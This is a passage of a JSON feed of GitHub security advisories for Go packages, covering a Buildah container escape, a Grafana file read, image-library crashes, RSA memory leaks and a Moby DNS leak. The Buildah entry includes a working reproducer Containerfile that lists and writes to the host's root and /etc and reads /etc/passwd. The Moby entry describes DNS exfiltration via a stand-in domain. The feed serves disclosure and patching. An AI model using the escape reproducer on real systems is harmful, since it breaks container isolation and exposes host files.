<code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-03-22T20:04:04.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-03-22T20:04:04.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Grafana &lt;= 6.4.3 has an Arbitrary File Read vulnerability, which could be exploited by an authenticated attacker that has privileges to modify the data source configurations.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-19499\">https://nvd.nist.gov/vuln/detail/CVE-2019-19499</a></li>\n<li><a href=\"https://github.com/grafana/grafana/pull/20192\">https://github.com/grafana/grafana/pull/20192</a></li>\n<li><a href=\"https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06\">https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20200918-0003/\">https://security.netapp.com/advisory/ntap-20200918-0003/</a></li>\n<li><a href=\"https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/\">https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4pwp-cx67-5cpx\">https://github.com/advisories/GHSA-4pwp-cx67-5cpx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4pwp-cx67-5cpx",
            "title": "[github.com/grafana/grafana/pkg/tsdb/mysql] Grafana Arbitrary File Read",
            "date_modified": "2024-03-22T18:29:33.000Z",
            "date_published": "2024-01-31T23:11:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4pwp-cx67-5cpx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>ZPLGFA 1.1.1 allows attackers to cause a panic (because of an integer index out of range during a ConvertToGraphicField call) via an image of zero width. NOTE: it is unclear whether there are common use cases in which this panic could have any security consequence</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36307\">https://nvd.nist.gov/vuln/detail/CVE-2023-36307</a></li>\n<li><a href=\"https://github.com/SimonWaldherr/zplgfa/pull/6\">https://github.com/SimonWaldherr/zplgfa/pull/6</a></li>\n<li><a href=\"https://github.com/SimonWaldherr/zplgfa/commit/c0d018ffa921cd2460b80f766b7969fbe63678fc\">https://github.com/SimonWaldherr/zplgfa/commit/c0d018ffa921cd2460b80f766b7969fbe63678fc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xgmm-3vvr-6c8j\">https://github.com/advisories/GHSA-xgmm-3vvr-6c8j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xgmm-3vvr-6c8j",
            "title": "[simonwaldherr.de/go/zplgfa] Index out of bounds leading to crash",
            "date_modified": "2024-03-21T18:58:12.000Z",
            "date_published": "2023-09-05T06:30:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xgmm-3vvr-6c8j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Disintegration Imaging 1.6.2 allows attackers to cause a panic (because of an integer index out of range during a Grayscale call) via a crafted TIFF file to the scan function of scanner.go. NOTE: it is unclear whether there are common use cases in which this panic could have any security consequence</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36308\">https://nvd.nist.gov/vuln/detail/CVE-2023-36308</a></li>\n<li><a href=\"https://github.com/disintegration/imaging/issues/165\">https://github.com/disintegration/imaging/issues/165</a></li>\n<li><a href=\"https://github.com/disintegration/imaging/releases/tag/v1.6.2\">https://github.com/disintegration/imaging/releases/tag/v1.6.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q7pp-wcgr-pffx\">https://github.com/advisories/GHSA-q7pp-wcgr-pffx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q7pp-wcgr-pffx",
            "title": "[github.com/disintegration/imaging] Crash when processing crafted TIFF files",
            "date_modified": "2024-03-21T18:57:47.000Z",
            "date_published": "2023-09-05T06:30:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q7pp-wcgr-pffx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>\n<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136\">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f\">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/releases/tag/v2.0.1\">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9\">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6",
            "title": "[github.com/microsoft/go-crypto-openssl/openssl] Memory leaks in code encrypting and verifying RSA payloads",
            "date_modified": "2024-03-21T14:05:20.000Z",
            "date_published": "2024-03-20T18:10:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>\n<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136\">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f\">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/releases/tag/v2.0.1\">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9\">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6",
            "title": "[github.com/golang-fips/openssl/v2] Memory leaks in code encrypting and verifying RSA payloads",
            "date_modified": "2024-03-21T14:05:20.000Z",
            "date_published": "2024-03-20T18:10:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>\n<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136\">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f\">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/releases/tag/v2.0.1\">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9\">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6",
            "title": "[github.com/microsoft/go-crypto-openssl] Memory leaks in code encrypting and verifying RSA payloads",
            "date_modified": "2024-03-21T14:05:20.000Z",
            "date_published": "2024-03-20T18:10:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>\n<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136\">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f\">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/releases/tag/v2.0.1\">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9\">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6",
            "title": "[github.com/golang-fips/openssl/openssl] Memory leaks in code encrypting and verifying RSA payloads",
            "date_modified": "2024-03-21T14:05:20.000Z",
            "date_published": "2024-03-20T18:10:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>\n<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136\">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f\">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>\n<li><a href=\"https://github.com/golang-fips/openssl/releases/tag/v2.0.1\">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9\">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78hx-gp6g-7mj6\">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6",
            "title": "[github.com/golang-fips/go] Memory leaks in code encrypting and verifying RSA payloads",
            "date_modified": "2024-03-21T14:05:20.000Z",
            "date_published": "2024-03-20T18:10:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78hx-gp6g-7mj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Moby is an open source container framework originally developed by Docker Inc. as Docker. It is a key component of Docker Engine, Docker Desktop, and other distributions of container tooling or runtimes. As a batteries-included container runtime, Moby comes with a built-in networking implementation that enables communication between containers, and between containers and external resources.</p>\n<p>Moby's networking implementation allows for creating and using many networks, each with their own subnet and gateway. This feature is frequently referred to as custom networks, as each network can have a different driver, set of parameters, and thus behaviors. When creating a network, the <code>--internal</code> flag is used to designate a network as <em>internal</em>. The <code>internal</code> attribute in a docker-compose.yml file may also be used to mark a network <em>internal</em>, and other API clients may specify the <code>internal</code> parameter as well.</p>\n<p>When containers with networking are created, they are assigned unique network interfaces and IP addresses (typically from a non-routable <a href=\"https://datatracker.ietf.org/doc/html/rfc1918\">RFC 1918</a> subnet). The root network namespace (hereafter referred to as the 'host') serves as a router for non-internal networks, with a gateway IP that provides SNAT/DNAT to/from container IPs.</p>\n<p>Containers on an <em>internal</em> network may communicate between each other, but are precluded from communicating with any networks the host has access to (LAN or WAN) as no default route is configured, and firewall rules are set up to drop all outgoing traffic. Communication with the gateway IP address (and thus appropriately configured host services) is possible, and the host may communicate with any container IP directly.</p>\n<p>In addition to configuring the Linux kernel's various networking features to enable container networking, <code>dockerd</code> directly provides some services to container networks. Principal among these is serving as a resolver, enabling service discovery (looking up other containers on the network by name), and resolution of names from an upstream resolver.</p>\n<p>When a DNS request for a name that does not correspond to a container is received, the request is forwarded to the configured upstream resolver (by default, the host's configured resolver). This request is made from the container network namespace: the level of access and routing of traffic is the same as if the request was made by the container itself.</p>\n<p>As a consequence of this design, containers solely attached to <em>internal</em> network(s) will be unable to resolve names using the upstream resolver, as the container itself is unable to communicate with that nameserver. Only the names of containers also attached to the internal network are able to be resolved.</p>\n<p>Many systems will run a local forwarding DNS resolver, typically present on a loopback address (<code>127.0.0.0/8</code>), such as systemd-resolved or dnsmasq. Common loopback address examples include <code>127.0.0.1</code> or <code>127.0.0.53</code>. As the host and any containers have separate loopback devices, a consequence of the design described above is that containers are unable to resolve names from the host's configured resolver, as they cannot reach these addresses on the host loopback device.</p>\n<p>To bridge this gap, and to allow containers to properly resolve names even when a local forwarding resolver is used on a loopback address, <code>dockerd</code> will detect this scenario and instead forward DNS requests from the host/root network namespace. The loopback resolver will then forward the requests to its configured upstream resolvers, as expected.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Because <code>dockerd</code> will forward DNS requests to the host loopback device, bypassing the container network namespace's normal routing semantics entirely, <em>internal</em> networks can unexpectedly forward DNS requests to an external nameserver.</p>\n<p>By registering a domain for which they control the authoritative nameservers, an attacker could arrange for a compromised container to exfiltrate data by encoding it in DNS queries that will eventually be answered by their nameservers. For example, if the domain <code>evil.example</code> was registered, the authoritative nameserver(s) for that domain could (eventually and indirectly) receive a request for <code>this-is-a-secret.evil.example</code>.</p>\n<p>Docker Desktop is not affected, as Docker Desktop always runs an internal resolver on a RFC 1918 address.</p>\n<h2 id=\"patches\">Patches</h2>\n<p>Moby releases 26.0.0-rc3, 25.0.5 (released) and 23.0.11 (to be released) are patched to prevent forwarding DNS requests from internal networks.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<ul>\n<li>Run containers intended to be solely attached to <em>internal</em> networks with a custom upstream address (<code>--dns</code> argument to <code>docker run</code>, or API equivalent), which will force all upstream DNS queries to be resolved from the container network namespace.</li>\n</ul>\n<h2 id=\"background\">Background</h2>\n<ul>\n<li>yair zak originally reported this issue to the Docker security team.</li>\n<li>PR <a href=\"https://github.com/moby/moby/pull/46609\">https://github.com/moby/moby/pull/46609</a> was opened in public to fix this issue, as it was not originally considered to have a security implication.</li>\n<li><a href=\"https://docs.docker.com/network/drivers/ipvlan/#:~:text=If%20the%20parent,the%20network%20completely\">The official documentation</a> claims that \"the <code>--internal</code> flag that will completely isolate containers on a network from any communications external to that network,\" which necessitated this advisory and CVE.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx\">https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx</a></li>\n<li><a href=\"https://github.com/moby/moby/pull/46609\">https://github.com/moby/moby/pull/46609</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mq39-4gv4-mvpx\">https://github.com/advisories/GHSA-mq39-4gv4-mvpx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mq39-4gv4-mvpx",
            "title": "[github.com/docker/docker] Moby's external DNS requests from 'internal' networks could lead to data exfiltration",
            "date_modified": "2024-03-20T17:59:53.000Z",
            "date_published": "2024-03-20T17:59:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mq39-4gv4-mvpx"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}